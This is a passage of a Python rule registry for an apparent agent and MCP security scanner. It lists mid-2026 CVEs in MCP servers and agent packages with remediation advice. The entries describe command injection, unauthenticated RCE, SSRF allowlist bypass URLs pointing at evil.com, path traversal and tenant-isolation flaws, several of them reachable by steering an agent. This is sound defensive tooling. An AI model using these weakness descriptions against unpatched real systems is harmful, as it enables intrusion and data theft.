    "redeems a single-use code via a non-atomic find-then-delete, so two concurrent "
    "requests both mint tokens (code replay, CVE-2026-53518). Treat < 1.6.11 (and "
    "unpinned) as exposed.",
    Severity.HIGH,
    Category.SUPPLY_CHAIN,
    "Upgrade `better-auth` / `@better-auth/oauth-provider` to >= 1.6.11 and pin it. "
    "Verify `client_secret` on confidential-client refresh grants and redeem "
    "authorization codes atomically (single-use, delete-on-read under a lock).",
    sarif_name="BetterAuthOauthTokenEndpointBypass",
    cve_references=["CVE-2026-53512", "CVE-2026-53518"],
    owasp_mcp_references=["MCP01:2025"],
    owasp_agentic_references=["ASI03"],
    adversa_references=["ADV-AUTH-01"],
)

# --- 2026-07-15..17 MCP/agent CVE disclosure wave (pinnable artifacts) -------
# Non-pinnable siblings (Frogman PHP PBX, Claude Code Action / GitHub Action,
# AI Copilot WordPress plugin, ForgeCode with no fixed version, Langflow with no
# NVD version data) are dispositioned in CHANGELOG.cves.md.

_r(
    "AAK-MCP-SDK-CVE-2026-52869-001",
    "MCP Python SDK session/task cross-client access (`mcp` < 1.28.1)",
    "The official MCP Python SDK (`mcp` on PyPI) before 1.28.1 has three "
    "session-isolation flaws reachable over its HTTP transports: the SSE and "
    "stateful Streamable HTTP transports route requests by `session_id` / "
    "`Mcp-Session-Id` without verifying the authenticated principal that created "
    "the session, so another bearer-authenticated client with a known session ID "
    "can inject JSON-RPC messages (CVE-2026-52869); the `experimental.enable_tasks()` "
    "default handlers key tasks only by id, letting any client enumerate / read / "
    "cancel other clients' tasks (CVE-2026-52870, from 1.23.0); and the deprecated "
    "`websocket_server` transport accepts handshakes with no Host/Origin validation "
    "(CVE-2026-59950). Treat < 1.28.1 (and unpinned) as exposed.",
    Severity.HIGH,
    Category.SUPPLY_CHAIN,
    "Upgrade `mcp` to >= 1.28.1 and pin it. Bind every session to the principal "
    "that created it and validate Host/Origin on WebSocket handshakes.",
    sarif_name="McpPythonSdkSessionIsolation",
    cve_references=["CVE-2026-52869", "CVE-2026-52870", "CVE-2026-59950"],
    owasp_mcp_references=["MCP01:2025"],
    owasp_agentic_references=["ASI03"],
    adversa_references=["ADV-AUTH-11"],
)

_r(
    "AAK-MCP-9ROUTER-CVE-2026-46339-001",
    "9Router unauthenticated MCP bridge → command execution (< 0.5.2)",
    "9Router (`9router`) before 0.5.2 exposes MCP routes without authentication "
    "and reaches command execution: `src/proxy.js` did not protect "
    "`/api/cli-tools/*` and `/api/mcp/*`, allowing unauthenticated customPlugin "
    "registration and command execution through the MCP bridge (CVE-2026-46339, "
    "CVSS 10); the `isLocalRequest()` gate trusts spoofable Host/Origin headers "
    "(CVE-2026-49353); and unvalidated MCP plugin args reach `child_process.spawn()` "
    "for RCE via `/api/mcp//sse` (CVE-2026-62312). Treat < 0.5.2 (and unpinned) as "
    "exposed.",
    Severity.CRITICAL,
    Category.SUPPLY_CHAIN,
    "Upgrade `9router` to >= 0.5.2 and pin it. Authenticate `/api/mcp/*` and "
    "`/api/cli-tools/*`, do not gate on Host/Origin headers, and validate plugin "
    "args before spawning subprocesses.",
    sarif_name="NineRouterMcpUnauthRce",
    cve_references=["CVE-2026-46339", "CVE-2026-49353", "CVE-2026-62312"],
    owasp_mcp_references=["MCP04:2025"],
    owasp_agentic_references=["ASI04"],
    adversa_references=["ADV-AUTH-01"],
)

_r(
    "AAK-MCP-N8NMCP-CVE-2026-54052-001",
    "n8n-MCP multi-tenant backup isolation bypass (`n8n-mcp` < 2.57.4)",
    "n8n-MCP (`n8n-mcp`) in HTTP multi-tenant mode (`ENABLE_MULTI_TENANT=true`) "
    "does not isolate local workflow version-history backups per tenant: before "
    "2.56.1 an authenticated tenant can read, delete, or destroy other tenants' "
    "workflow snapshots — including node definitions, credential references, and "
    "authorization headers (CVE-2026-54052, CVSS 9.9); before 2.57.4 a tenant can "
    "also reach default-scope `workflow_versions` backups from prior single-tenant "
    "deployments (CVE-2026-55608). Treat < 2.57.4 (and unpinned) as exposed.",
    Severity.CRITICAL,
    Category.SUPPLY_CHAIN,
    "Upgrade `n8n-mcp` to >= 2.57.4 and pin it. Scope every backup read/write to "
    "the authenticated tenant.",
    sarif_name="N8nMcpTenantIsolation",
    cve_references=["CVE-2026-54052", "CVE-2026-55608"],
    owasp_mcp_references=["MCP01:2025"],
    owasp_agentic_references=["ASI04"],
    adversa_references=["ADV-AUTH-01"],
)

_r(
    "AAK-MCP-DBTMCP-CVE-2026-44968-001",
    "dbt-mcp flag injection + tool-arg leakage (`dbt-mcp` < 1.17.1)",
    "`dbt-mcp` before 1.17.1 appends unsanitized `node_selection` / `resource_type` "
    "values to the dbt subprocess argv, letting an MCP client inject dbt global "
    "flags such as `--profiles-dir` / `--project-dir` / `--target` into "
    "`subprocess.Popen` even with `shell=False` (CVE-2026-44968); it also emits "
    "every tool call's full arguments (`sql_query`, `vars`, `node_selection`) "
    "through telemetry (CVE-2026-44970, on by default) and file logging "
    "(CVE-2026-44969) without redaction. Treat < 1.17.1 (and unpinned) as exposed.",
    Severity.MEDIUM,
    Category.SUPPLY_CHAIN,
    "Upgrade `dbt-mcp` to >= 1.17.1 and pin it. Validate `node_selection` / "
    "`resource_type` against an allow-list before adding them to argv, and redact "
    "tool arguments in telemetry / logs.",
    sarif_name="DbtMcpFlagInjection",
    cve_references=["CVE-2026-44968", "CVE-2026-44970", "CVE-2026-44969"],
    owasp_mcp_references=["MCP04:2025"],
    owasp_agentic_references=["ASI09"],
    adversa_references=["ADV-INJECT-01"],
)

_r(
    "AAK-MCP-APIFY-CVE-2026-46341-001",
    "Apify MCP docs-allowlist bypass SSRF (`@apify/actors-mcp-server` < 0.9.21)",
    "The Apify MCP server (`@apify/actors-mcp-server`) before 0.9.21 validates the "
    "`fetch-apify-docs` allowlisted documentation domains with `String.startsWith()` "
    "instead of hostname comparison, so attacker URLs such as "
    "`https://docs.apify.com.evil.com/` or `https://docs.apify.com@evil.com/` pass "
    "the `ALLOWED_DOC_DOMAINS` check and return arbitrary fetched content to the LLM "
    "(CVE-2026-46341, CVSS 6.1, SSRF). Treat < 0.9.21 (and unpinned) as exposed.",
    Severity.MEDIUM,
    Category.SUPPLY_CHAIN,
    "Upgrade `@apify/actors-mcp-server` to >= 0.9.21 and pin it. Allow-list by "
    "parsed URL hostname (exact / suffix match), never `startsWith` on the raw URL.",
    sarif_name="ApifyMcpDocsAllowlistSsrf",
    cve_references=["CVE-2026-46341"],
    owasp_mcp_references=["MCP09:2025"],
    owasp_agentic_references=["ASI06"],
    adversa_references=["ADV-SSRF-01"],
)

_r(
    "AAK-MCP-AGENTICFLOW-CVE-2026-58195-001",
    "Agentic-Flow MCP tool params → execSync command injection (< 2.0.14)",
    "`agentic-flow` before 2.0.14 interpolates attacker-influenceable MCP tool "
    "parameters (`agent`, `task`, `name`, `language`, `agentdb`) directly into "
    "shell command strings passed to `execSync()` across its stdio / FastMCP server "
    "and agent/swarm/hooks tools, allowing arbitrary OS command execution as the "
    "MCP server user (CVE-2026-58195, CVSS 8.8). Treat < 2.0.14 (and unpinned) as "
    "exposed.",
    Severity.HIGH,
    Category.SUPPLY_CHAIN,
    "Upgrade `agentic-flow` to >= 2.0.14 and pin it. Never pass tool parameters "
    "into a shell; use argv-array subprocess calls with validated inputs.",
    sarif_name="AgenticFlowMcpExecSyncInjection",
    cve_references=["CVE-2026-58195"],
    owasp_mcp_references=["MCP04:2025"],
    owasp_agentic_references=["ASI04"],
    adversa_references=["ADV-INJECT-01"],
)

_r(
    "AAK-MCP-HEALTHOMICS-CVE-2026-15415-001",
    "AWS HealthOmics MCP workflow-bundle path traversal (< 0.0.36)",
    "The AWS HealthOmics MCP server (`awslabs.aws-healthomics-mcp-server`) before "
    "0.0.36 improperly limits pathnames in its linting tools, so an actor who can "
    "influence the MCP agent can write actor-controlled content outside the "
    "intended workflow-bundle directory via directory-traversal sequences in the "
    "`workflow_files` input (CVE-2026-15415, CVSS 5.5, CWE-22). Treat < 0.0.36 "
    "(and unpinned) as exposed.",
    Severity.MEDIUM,
    Category.SUPPLY_CHAIN,
    "Upgrade `awslabs.aws-healthomics-mcp-server` to >= 0.0.36 and pin it. Resolve "
    "and contain every `workflow_files` path under the bundle root before writing.",
    sarif_name="HealthOmicsMcpPathTraversal",
    cve_references=["CVE-2026-15415"],
    owasp_mcp_references=["MCP04:2025"],
    owasp_agentic_references=["ASI09"],
    adversa_references=["ADV-PATH-01"],
)


# ---------------------------------------------------------------------------
# Internal / meta rules (surfaced when the scanner itself has a problem)
# ---------------------------------------------------------------------------

_r(
    "AAK-INTERNAL-SCANNER-FAIL",
    "Scanner module raised an exception",
    "A scanner module crashed during execution. The scan continued with the "
    "remaining scanners, but results may be incomplete. This is always a bug "
    "in agent-audit-kit itself; please file an issue with the evidence string.",
    Severity.INFO,
    Category.AGENT_CONFIG,
    "File an issue at https://github.com/sattyamjjain/agent-audit-kit/issues "
    "with the scanner name, exception class, and (if safe) the project shape.",
    sarif_name="InternalScannerFail",
)


# ---------------------------------------------------------------------------
# Public API
# ---------------------------------------------------------------------------


def get_rule(rule_id: str) -> RuleDefinition:
    """Retrieve a rule definition by its unique ID.

    Args:
        rule_id: The rule identifier (e.g., "AAK-MCP-001").

    Returns:
        The matching RuleDefinition.

    Raises:
        KeyError: If the rule_id is not registered.
    """
    return RULES[rule_id]


def all_rule_ids() -> list[str]:
    """Return all registered rule IDs in registration order."""
    return list(RULES.keys())


def rules_for_category(category: Category) -> list[RuleDefinition]:
    """Return all rules belonging to the given category.

    Args:
        category: The Category enum value to filter by.

    Returns:
        A list of RuleDefinition objects matching the category.
    """
    return [r for r in RULES.values() if r.category == category]


def _apply_aicm_overlay() -> None:
    """Apply _AICM_TAGS to registered rules. Missing rule IDs are ignored
    so the overlay doesn't fail the module if someone removes a rule."""
    for rid, controls in _AICM_TAGS.items():
        rule = RULES.get(rid)
        if rule is None:
            continue
        for cid in controls:
            if cid not in rule.aicm_references:
                rule.aicm_references.append(cid)


_apply_aicm_overlay()
